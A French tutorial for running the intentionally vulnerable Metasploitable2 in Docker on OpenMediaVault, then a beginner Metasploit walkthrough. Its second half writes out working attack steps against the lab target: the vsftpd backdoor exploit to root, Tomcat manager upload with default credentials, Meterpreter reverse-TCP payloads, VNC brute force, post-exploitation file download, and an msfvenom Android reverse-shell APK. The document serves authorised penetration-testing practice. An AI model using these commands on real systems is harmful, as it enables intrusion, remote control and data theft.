
# METASPLOITABLE2 <span style="color: orange">Installation et Tutoriel</span>

## <span style="color: green">Tutoriel d’Installation Propre, Démarrage, Arrêt et Recherche de l’IP de Metasploitable2 sur OpenMediaVault</span>

Ce tutoriel vous guide pour installer proprement **Metasploitable2** sur un serveur OpenMediaVault (OMV) avec Docker, démarrer et arrêter le conteneur, et trouver son adresse IP. 

Conçu pour un environnement NAS comme OMV, ce guide intègre des solutions pour maintenir le conteneur en exécution. Les étapes sont détaillées pour être suivies facilement, avec des commandes précises et des explications.<br>

## Racourcis aprés installations <br>
Les raccourcis expriment de l'aide après installation. : <br>

Utilisateur ROOT : <br>
User : msfadmin <br>
Mot de passe : msfadmin<br>
<br>

Avoir l'ip du contener :<br>
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2<br>

Maper les ports : (Vous pouvez maper plus de ports.) <br>
docker run -d --name metasploitable2 -p 10021:21 -p 10022:22 -p 10080:80 -p 10443:443 -p 10023:23 -p 10445:445 -p 13306:3306 -p 15900:5900 tleemcjr/metasploitable2 /bin/bash -c "service ssh start; service apache2 start; tail -f /dev/null"

Testez les services : Depuis votre machine Kali Linux, testez les ports mappés : FTP : ftp <adresse_IP_hôte> 10021 SSH : ssh -p 10022 msfadmin@<adresse_IP_hôte> HTTP : Ouvrez un navigateur ou utilisez curl http://<adresse_IP_hôte>:10080 <br>
Ca fonctionne ici! <br>
ssh -p 10022 -o HostKeyAlgorithms=ssh-rsa -o KexAlgorithms=diffie-hellman-group1-sha1 msfadmin@[TON-IP_LOCAL]

## FIN des Racourcis <br>

# <span style="color: blue">Introduction</span>

Metasploitable2 est une machine virtuelle intentionnellement vulnérable utilisée pour les tests de pénétration. <br>

Ce tutoriel suppose que vous avez un serveur OMV fonctionnel et que vous accédez à son interface via SSH. Nous allons installer Docker, configurer Metasploitable2 pour qu’il reste actif, et expliquer comment le gérer.<br>


## <span style="color: purple">Étape 1 : Préparation et Installation de Docker sur OpenMediaVault</span>

### 1.1 Activer SSH sur OMV

Pour commencer, activez SSH sur votre serveur OMV :

- Accédez à l’interface web d’OMV (par exemple, `http://<adresse_IP_du_serveur>:80`).
- Allez dans **Services > SSH**.
- Activez SSH, laissez le port par défaut (22), et cochez "Permettre la connexion root" si nécessaire.
- Appliquez les modifications.

### 1.2 Installer OMV-Extras

Ensuite, installez OMV-Extras pour ajouter des fonctionnalités comme Docker :

- Connectez-vous au serveur via SSH avec :<br>
  bash<br>
  ssh root@<adresse_IP_du_serveur<br>
  (Remplacez <adresse_IP_du_serveur> par l’IP réelle de votre serveur OMV.)
## Installez OMV-Extras avec cette commande : <br>
bash<br>
wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install | bash<br>
Une fois terminé, actualisez l’interface web d’OMV. Vous verrez un nouveau menu OMV-Extras sous Système.
### 1.3 Installer Docker via OMV-Extras
Docker est nécessaire pour exécuter Metasploitable2 :<br>
Dans l’interface web d’OMV, allez dans OMV-Extras > Docker.<br>
Cliquez sur Installer Docker. L’installation prendra quelques minutes.<br>
Vérifiez que le statut passe à "installé et en cours d’exécution".<br>
### 1.4 (Optionnel) Configurer le Stockage Docker<br>
Par défaut, Docker utilise le système de fichiers racine, ce qui peut être limité sur un NAS. Pour éviter cela :<br>
Créez un dossier partagé dans OMV (par exemple, /srv/dev-disk-by-label/data/docker) via Stockage > Systèmes de fichiers.<br>
Allez dans OMV-Extras > Docker > Paramètres, et définissez ce chemin comme emplacement pour les données Docker.<bt>
Appliquez les modifications.<br>
<span style="color: #0000FF">Étape 2 : Installation Propre de Metasploitable2</span>
### 2.1 Supprimer toute trace précédente
Si vous avez déjà un conteneur Metasploitable2, supprimez-le pour repartir de zéro :<br>
bash<br>
docker rm -f metasploitable2<br>
### 2.2 Télécharger l’image Metasploitable2
Téléchargez l’image officielle de Metasploitable2 depuis Docker Hub :<br>
bash<br>
docker pull tleemcjr/metasploitable2<br>
Cela télécharge une image d’environ 1,51 Go contenant Metasploitable2.<br>
### 2.3 Créer un réseau Docker personnalisé
Créez un réseau isolé pour vos conteneurs (par exemple, pentest) :<br>
bash<br>
docker network create pentest<br>
Ce réseau permet une communication sécurisée entre Metasploitable2 et d’autres conteneurs (comme Kali Linux pour Metasploit).<br>
### 2.4 Lancer Metasploitable2 avec une configuration persistante
Lancez le conteneur en mode détaché, en vous assurant qu’il reste actif après le démarrage des services :<br>
bash>br>
docker run -d --name metasploitable2 --network pentest tleemcjr/metasploitable2 /bin/bash -c "/etc/rc.local; tail -f /dev/null"<br>
#Explications :
-d : Exécute le conteneur en arrière-plan.<br>
--name metasploitable2 : Nomme le conteneur pour une gestion facile.<br>
--network pentest : Connecte le conteneur au réseau personnalisé.<br>
/bin/bash -c "/etc/rc.local; tail -f /dev/null" : Exécute /etc/rc.local pour démarrer les services (Apache, MySQL, etc.), puis maintient le conteneur en vie avec tail -f /dev/null.<br>
<span style="color: teal">Étape 3 : Gestion du Conteneur (Démarrage, Arrêt, IP)</span>
### 3.1 Vérifier que le conteneur est en cours d’exécution
Après avoir lancé le conteneur, vérifiez son état :<br>
bash<br>
docker ps<br>
Vous devriez voir une ligne comme celle-ci :<br>
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS     NAMES<br>
abc123         tleemcjr/metasploitable2   "/bin/bash -c '/etc/rc.local; tail -f /dev/null'"   2 minutes ago   Up 2 minutes             metasploitable2<br>
Si le conteneur n’apparaît pas, utilisez docker ps -a pour voir s’il est arrêté, et passez à l’étape suivante.<br>
### 3.2 Démarrer le conteneur
Si le conteneur est arrêté (par exemple, après un redémarrage du serveur) :<br>
bash<br>
docker start metasploitable2<br>
Vérifiez à nouveau avec docker ps qu’il est en cours d’exécution.<br>
### 3.3 Arrêter le conteneur
Pour arrêter le conteneur proprement :<br>
bash<br>
docker stop metasploitable2<br>
Cela envoie un signal d’arrêt aux processus du conteneur.<br>
### 3.4 Trouver l’adresse IP de Metasploitable2
Pour obtenir l’adresse IP du conteneur :<br>
bash<br>
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2 <br>
Cela retournera une adresse IP, par exemple 172.17.0.3, que vous pouvez utiliser pour interagir avec Metasploitable2 (ex. pour des tests avec Metasploit).<br>
### 3.5 (Optionnel) Supprimer le conteneur
Si vous souhaitez supprimer complètement le conteneur :<br>
bash<br>
docker rm -f metasploitable2<br>
Relancez-le avec la commande de l’étape 2.4 si nécessaire.<br>
<span style="color: gold">Étape 4 : Vérifications et Bonnes Pratiques</span>
### 4.1 Vérifier les ressources
OMV étant un NAS, vérifiez que le conteneur n’épuise pas les ressources :<br>
bash<br>
docker stats metasploitable2<br>
Assurez-vous que votre serveur a au moins 2 Go de RAM disponibles pour éviter des problèmes de performance.<br>
### 4.2 Sécurité
Metasploitable2 est vulnérable par conception :<br>
Ne l’exposez pas à Internet.<br>
Utilisez-le uniquement dans un environnement contrôlé, comme le réseau Docker pentest.<br>
### 4.3 Sauvegarde de la configuration
Notez les commandes utilisées (par exemple, dans un fichier texte) pour recréer facilement votre environnement si nécessaire.<br><br>
<span style="color: cyan">Résumé des Commandes Clés</span>
Action<br>
Commande<br>
Installer OMV-Extras<br>
`wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install
### Télécharger Metasploitable2
docker pull tleemcjr/metasploitable2<br>
## Créer un réseau Docker
docker network create pentest<br>
## Lancer Metasploitable2
docker run -d --name metasploitable2 --network pentest tleemcjr/metasploitable2 /bin/bash -c "/etc/rc.local; tail -f /dev/null"
## Démarrer le conteneur
docker start metasploitable2
## Arrêter le conteneur
docker stop metasploitable2
## Trouver l’IP
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2
## Vérifier l’état
docker ps
## Supprimer le conteneur
docker rm -f metasploitable2
<span style="color: magenta">Conclusion</span>

Avec ce tutoriel, vous avez une installation propre de Metasploitable2 sur votre serveur OMV. Le conteneur est configuré pour rester actif grâce à tail -f /dev/null, et vous pouvez le démarrer, l’arrêter, et trouver son IP facilement.<br>
Vous êtes maintenant prêt à utiliser Metasploit pour tester cette cible vulnérable dans un environnement sécurisé. Si vous avez besoin d’aide pour configurer Metasploit ou d’autres étapes, n’hésitez pas à demander !<br>
### <span style="color: lime">Points Clés</span>
<hr>Metasploit</hr> est un outil puissant pour tester la sécurité des systèmes, mais il doit être utilisé dans un environnement autorisé.<br>
Ce tutoriel inclut des exemples pratiques pour débutants, comme exploiter des vulnérabilités sur une machine virtuelle comme Metasploitable2.<br>
Avec de la pratique, vous pourrez maîtriser les bases comme rechercher des modules et lancer des exploits.<br>
### <span style="color: orange">Introduction à Metasploit</span>
Metasploit est un framework open-source utilisé pour les tests de pénétration, permettant de découvrir et exploiter des vulnérabilités dans les systèmes et réseaux. Il est idéal pour les débutants souhaitant apprendre, mais il est crucial de l’utiliser uniquement sur des systèmes autorisés, comme des machines virtuelles (ex. Metasploitable2 ou 3, disponible sur Metasploit).<br>
Ce tutoriel vous guide pas à pas, avec des exemples concrets, pour vous familiariser avec l’interface, la recherche de modules, la configuration d’options, et l’exécution d’exploits. Une étape inattendue pourrait être l’utilisation de Meterpreter pour des tâches avancées comme la recherche de fichiers sur la cible.<br>
### <span style="color: green">Exemples Pratiques</span>
Voici quelques exemples pour vous aider à démarrer, en supposant que vous utilisez Kali Linux et une machine cible comme Metasploitable2 :
### Lancer Metasploit : Ouvrez un terminal et tapez :
bash<br>
msfconsole<br>
### Rechercher un exploit : Pour trouver un exploit pour vsftpd :
bash<br>
search vsftpd<br <br>
### Puis sélectionnez :
bash<br>
use exploit/unix/ftp/vsftpd_234_backdoor<br>
### Configurer et lancer : Définissez l’adresse IP de la cible :
bash<br>
set RHOSTS 192.168.1.129(IP cible)<br>
set payload cmd/unix/interact<br>
exploit<br>
### Vérifiez votre accès avec :<br>
bash<br>
whoami<br>
### Cela devrait retourner root.
Ces étapes sont simples à suivre et vous donnent un aperçu pratique de l’outil.<br>
### <span style="color: blue">Note Détaillée</span>
###Contexte et Importance de Metasploit
Metasploit, développé par Rapid7, est un framework open-source essentiel pour les tests de pénétration, utilisé par les analystes en sécurité et les testeurs pour identifier et exploiter des vulnérabilités. Il est particulièrement utile pour simuler des attaques et renforcer la sécurité des systèmes.<br>
Cependant, son utilisation sans autorisation est illégale, ce qui en fait un sujet sensible nécessitant une approche éthique. Les recherches suggèrent que Metasploit est souvent préinstallé sur des distributions comme Kali Linux ou Parrot Security, facilitant son accès pour les utilisateurs. Pour pratiquer en toute sécurité, il est recommandé d’utiliser des machines virtuelles comme Metasploitable2 ou 3, disponibles sur Metasploit. Ces environnements sont conçus pour être vulnérables, offrant un terrain d’apprentissage sans risque.<br>
### Installation et Lancement
Pour commencer, Metasploit peut être lancé via deux méthodes sur Kali Linux :
Via le menu Applications : Allez dans 08 Exploitation Tools > metasploit framework.<br>
Ou directement en terminal avec la commande :<br>
bash<br>
msfconsole<br>
Cela affiche l’interface avec un prompt MSF.<br>
### Il est conseillé de mettre à jour la base de données avec :
bash<br>
db_update<br>
Cela garantit l’accès aux derniers exploits et vulnérabilités (au 19 mars 2025, cela inclut les mises à jour récentes).<br>
Recherche et Sélection de Modules<br>
Metasploit propose une vaste bibliothèque de modules, organisés en catégories comme exploits, payloads, et auxiliaires. La recherche peut être affinée avec des filtres, par exemple :<br>
### Pour des exploits Windows de 2023 :
bash<br>
search cve:2023 type:exploit platform:windows<br>
### Pour des modules Tomcat :
bash<br>
search tomcat
### Une fois un module trouvé, sélectionnez-le avec use, par exemple :
bash<br>
use exploit/multi/http/tomcat_mgr_upload<br>
### Les classements (Excellent, Great, etc.) peuvent guider votre choix.
Configuration des Options<br>
Chaque module a des options spécifiques, affichées avec :<br>
bash<br>
options<br>
### Par exemple, pour un exploit vsftpd :
Configurez l’adresse IP cible :<br>
bash<br>
set RHOSTS 192.168.1.129(IP CIBLE pour exemple)<br>
Vérifiez avec :<br>
bash<br>
show options<br>
### Cela montre les paramètres comme RPORT (par défaut 21 pour FTP).<br>
### Pour des exploits nécessitant des identifiants, comme Apache Tomcat :
bash<br>
set HttpUsername tomcat<br>
set HttpPassword tomcat<br>
### Même si certains champs sont marqués comme non requis, ils peuvent être essentiels.
Sélection et Configuration des Payloads<br>
### Les payloads définissent ce qui se passe après l’exploitation. Par exemple, pour une shell inverse avec Meterpreter :
Utilisez :<br>
bash<br>
set payload java/meterpreter/reverse_tcp<br>
Configurez :<br>
bash<br>
set LHOST 192.168.74.128<br>
set LPORT 4444<br>
### Vous pouvez lister les payloads disponibles avec :
bash<br>
show payloads<br>
Cela offre des options comme bind/reverse shell ou staged/non-staged (ex. windows/meterpreter/reverse_tcp).<br>
Lancement de l’Exploit et Post-Exploitation<br>
### Lancez l’exploit avec :
bash<br>
exploit<br>
Ou :<br>
bash<br>
run<br>
### Selon le module.
Pour vsftpd :<br>
Après configuration, exploit ouvre une session. Vérifiez avec :<br>
bash<br>
whoami<br>
### Cela devrait retourner root sur Metasploitable2.
Pour des tâches post-exploitation, Meterpreter offre des fonctionnalités avancées :<br>
Rechercher des fichiers :<br>
bash<br>
search -f license.txt<br>
(Trouve 8 fichiers, par exemple.)<br>
### Télécharger un fichier :
bash<br>
download /var/www/tikiwiki-old/license.txt<br>
(Télécharge 23.81 KiB.)
### Accéder à une shell système :
bash<br>
shell<br>
whoami<br>
### Exemples Pratiques Détaillés
## Voici un tableau récapitulatif d’exemples pratiques :
Exemple<br>

Module/Commande<br>

Configuration<br>

Résultat Attendu<br>

Exploiter vsftpd<br>

use exploit/unix/ftp/vsftpd_234_backdoor<br>

set RHOSTS 192.168.74.129, exploit<br>

Shell root, whoami retourne root<br>

Scanner Samba et exploiter<br>

use auxiliary/scanner/smb/smb_version, puis use 1<br>

set RHOSTS 192.168.74.129, exploit<br>

### Détecte Samba 3.0.20, accès root<br>

Brute force VNC<br>

use auxiliary/scanner/vnc/vnc_login<br>

set RHOSTS 192.168.74.129, run<br>


### Trouve mot de passe ("password"), accès GUI<br>
Upgrader à Meterpreter<br>

use post/multi/manage/shell_to_meterpreter<br>

set SESSION 4, exploit<br>

### Session Meterpreter, accès avancé
Créer payload Android<br>

msfvenom -p android/meterpreter/reverse_tcp ...<br>

LHOST=192.168.74.128, LPORT=8080, -o payload.apk<br>

Fichier APK généré, 13625 bytes<br>

Création de Payloads Personnalisés<br>

Avec msfvenom, vous pouvez générer des payloads pour différents systèmes. Par exemple, pour Android :<br>

bash<br>

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.74.128 LPORT=8080 -o /root/Desktop/payload.apk<br>

Configurez un handler avec :<br>

bash<br>

use exploit/multi/handler<br>

set payload android/meterpreter/reverse_tcp<br>

run<br>

###Cela permet de tester des applications mobiles, une fonctionnalité inattendue pour ceux qui se concentrent uniquement sur les réseaux.
Conseils et Précautions<br>

Pratiquer sur des systèmes autorisés est crucial. Utilisez Metasploitable, téléchargeable sur Rapid7.<br>

# Ne testez jamais sur des systèmes sans permission, car cela peut être illégal.

### Explorez les ressources supplémentaires comme HackTheBox pour des modules de formation, ou StationX pour des guides détaillés.
## <span style="color: purple">Conclusion</span>
Ce tutoriel couvre les bases et des exemples avancés de Metasploit, adaptés aux débutants. En suivant ces étapes, vous devriez être capable de comprendre comment rechercher, configurer, et exploiter des vulnérabilités, tout en explorant des fonctionnalités comme Meterpreter et msfvenom. 

